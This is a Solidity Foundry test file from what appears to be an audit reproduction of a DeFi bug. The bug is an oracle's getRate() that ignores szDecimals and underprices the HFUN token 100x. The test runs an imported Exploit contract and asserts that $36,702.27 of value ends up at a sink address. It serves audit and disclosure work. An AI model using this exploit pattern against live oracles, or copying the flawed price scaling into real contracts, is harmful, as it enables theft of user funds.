// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, BlueberrySpotOracle, SpotPxPrecompile, OracleConsumer, MarkerUSD} from "./61478-h-01-getrate-ignores-szdecimals-pashov-audit-group-none-blue.sol";

// Blueberry H-01 (finding 61478): getRate() scales the Hyperliquid SPOT-PX
// precompile price by a FIXED 10**(18-8) factor, ignoring the asset's szDecimals.
// HFUN (szDecimals=2, raw price 37073000 = $37.073) is under-reported 100x as
// $0.37073, so any USD valuation derived from it is 100x too low.
contract Finding61478Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_getRate_ignores_szDecimals_underprices_100x() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("buggy getRate()  (0.37073e18)", e.buggyRate());
        emit log_named_uint("correct rate     (37.073e18) ", e.correctRate());
        emit log_named_uint("perceived value  ($370.73)   ", e.buggyValue());
        emit log_named_uint("true value       ($37,073)   ", e.correctValue());
        emit log_named_uint("value at risk    ($36,702.27)", e.valueAtRisk());

        // getRate under-reports HFUN by exactly 10**szDecimals = 100x
        assertEq(e.buggyRate() * 100, e.correctRate(), "rate not 100x underpriced");
        assertEq(e.buggyValue() * 100, e.correctValue(), "position not misvalued 100x");
        // concrete harm: $36,702.27 of value put at risk, recorded at SINK
        assertEq(e.valueAtRisk(), 36702.27e18, "unexpected value-at-risk");
        assertEq(MarkerUSD(e.usd()).balanceOf(SINK), e.valueAtRisk(), "harm not at sink");
        assertGt(e.valueAtRisk(), 0, "no harm");
    }
}
